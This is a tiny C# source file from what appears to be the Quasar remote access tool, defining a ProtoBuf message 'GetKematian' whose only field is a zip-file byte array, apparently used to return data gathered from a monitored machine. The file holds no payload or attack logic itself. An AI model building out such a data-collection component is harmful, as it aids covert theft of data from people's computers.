using ProtoBuf;
using Quasar.Common.Messages.other;

namespace Quasar.Common.Messages.Monitoring.Kematian
{
    [ProtoContract]
    public class GetKematian : IMessage
    {
        [ProtoMember(1)]
        public byte[] ZipFile { get; set; }
    }
}
